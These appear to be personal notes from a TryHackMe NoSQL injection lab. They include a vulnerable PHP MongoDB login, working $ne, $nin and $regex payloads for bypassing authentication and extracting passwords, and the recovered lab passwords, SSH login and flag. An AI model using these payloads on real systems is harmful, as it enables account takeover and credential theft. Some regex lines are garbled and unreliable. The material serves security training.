#SQL 

- https://tryhackme.com/room/nosqlinjectiontutorial

foxy proxy and intruder on
send request to Repeater > make edits > send 
## Basics

MongoDB 
MongoDB is another database where you can store data in an ordered way, get subsets of data, relational DB but data is stored in documents NOT tables

these documents as a simple dictionary structure where key-value pairs are stored

```mongoDB
{
	"_id": ObjectId("5f077332de2cdf808d26cd74")
	"username" : "lphillips", 
	"first_name" : "Logan", 
	"last_name" : "Phillips", 
	"age" : "65", 
	"email" : "lphillips@example.com"
}
```

MongoDB allows you to group multiple documents with a similar function together in higher hierarchy structures called collections for organizational purposes.
- collections == tables (relational DB)

all employee's documents grouped in collection called people
collections are grouped in databases 
- HR DB = {People Collection} {Payroll Collection} {Branches Collection}

```MongoDB
{"username": "lphillips", "fname":"logan","lname":"Phillips","age":65}
{"username": "asandlr", "fname":"angus","lname":"Sandler","age":34}
{"username": "aclarke", "fname":"anne","lname":"Clarke","age":42}
```

- https://www.mongodb.com/docs/manual/reference/operator/query/
- `$lt` = less than

Filter for 'Sandler'
- ` [lname => 'Sandler'] ` 
- 
Filter for 'age' < 50
- ` ['age' => ['$lt' =>'50'] ] `

## NoSQL Injection

`10.10.89.176`  login form

Unlike SQL injection, where queries were normally built by simple string concatenation, NoSQL queries require nested associative arrays.
- must be able to inject arrays into the app
- pass array variables using special syntax on HTTP request query string

```PHP
<?PHP
$con = new MongoDB\Driver\Manager("mongodb://localhost:27017")

if(isset($_POST) && isset($_POST['user']) && isset($_POST['pass'])){
	$user = $_POST['user'];
	$pass = $_POST['pass'];

	$q = new MongoDB\Driver\Query(['username' => $user, 'password' => $pass]);
	$record = $con -> executeQuery('myapp.login', $q);
	$record = iterator_to_array($record);

if(sizeof($record) > 0){
		$usr = $record[0];
		session_start();
		$_SESSION['loggedin'] = true;
		$_SESSION['uid'] = $usr -> username;
		header('Location: /menu.php');
		die();
	}
}
```

The web application is making a query to MongoDB, using the "`myapp`" database and "**login**" collection, requesting any document that passes the filter `**['username'=>$user, 'password'=>$pass]**`, where both **$user** and **$pass** are obtained directly from HTTP POST parameters

- ` $user = ['$ne'=>'xxxx'] `
- ` $pass = ['$ne'=>'yyyy'] `

## Bypass login screen

open Burp Suite, proxy foxy, enter invalid credentials , Intercept edit it then forward

entered `name:pass`
```
user=name&pass=pass&remember=on

--- change it 

user[$ne]=asdf&pass[$ne]=aweasdf&remember=on

```

- `admin: ************`
- `admin@nosql.int`

## Login as other users

with the former technique, we can only login as the first user returned by the database.

`$nin` matches none of the values in a array

 if we would want to log in as any user except for the user admin, we could modify our payload to look like this:
```
user[$nin][]=admin&pass[$ne]=aweasdf&remember=on

----
['username'=>['$nin'=>['admin'] ], 'password'=>['$ne'=>'aweasdf']]
```

- `pedro`
- `pcollins@nosql.int`
- non-admin user

```
user[$nin][]=admin&user[$nin][]=jude&pass[$ne]=awesf&remember=on

--
['username'=>['$nin'=>['admin', 'jude'] ], 'password'=>['$ne'=>'aweasdf']]

user[$nin][]=pedro&user[$nin][]=admin&pass[$ne]=admin&remember=on
```

- `john`
- `jsmith@nosql.int`

3 users

## Extract user passwords

we have access to all of the accounts in the application. However, it is important to try to extract the actual passwords in use as they might be reused in other services.

`$regex` operator 

ask the server a series of questions to recover passwords (like hangman game)

```
user=admin&pass[$regex]=^.{7}&remember=on     # error

user=admin&pass[$regex]=^.{5}&remember=on     # success

```
- a wildcard word of length 7
look for the Response Location to be not `/?err=1` 

we get a hit for `admin` password of length 5
```
user=admin&pass[$regex]=^c.....&remember=on  # fails

user=admin&pass[$regex]=^a.....&remember=on  
# success= (Response) Location: /sekretplace.php

```

admin has password of length 5 and starts with `a`

what is John's password ?
- 7 characters
```
user=john&pass[$regex]=^$.$.......$&remember=on

-- look for diff in length, 1 = 307 unlike others of 188
-- so 1st number of password is 1
- repeat process, each . is $.$ 1 at a time, replace with found number

10584312     correct!
```

  
One of the users seems to be reusing his password for many services. Find which one and connect through SSH to retrieve the final flag!
- there are 3 users: `admin, pedro, john`

```
user=pedro&pass[$regex]=^.{11}$&remember=on

-- then intruder
user=pedro&pass[$regex]=$.$..........&remember=on
-- repeat process of finding 1st $.$ replace it, next $.$

coolpass123
```

`ssh pedro@10.10.116.125` : `coolpass123`

- ` flag{N0Sql_n01iF3!} `

---
- https://www.youtube.com/watch?v=-gN3ZYOxXak&lc=Ugwl_1t_8doGAFQCQpZ4AaABAg